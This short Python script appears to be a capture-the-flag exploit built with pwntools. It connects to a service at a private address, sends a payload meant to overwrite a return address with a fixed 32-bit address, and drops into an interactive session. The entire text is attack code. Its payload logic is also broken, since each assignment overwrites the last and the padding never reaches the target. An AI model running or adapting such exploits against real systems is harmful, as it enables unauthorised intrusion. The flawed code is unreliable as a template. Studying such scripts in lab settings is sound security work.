from pwn import *

target = remote("172.30.69.191",1378 )

payload = ""
payload = "0"*0x10 
payload = p32(0x565558c5)

target.sendline(payload)


target.interactive()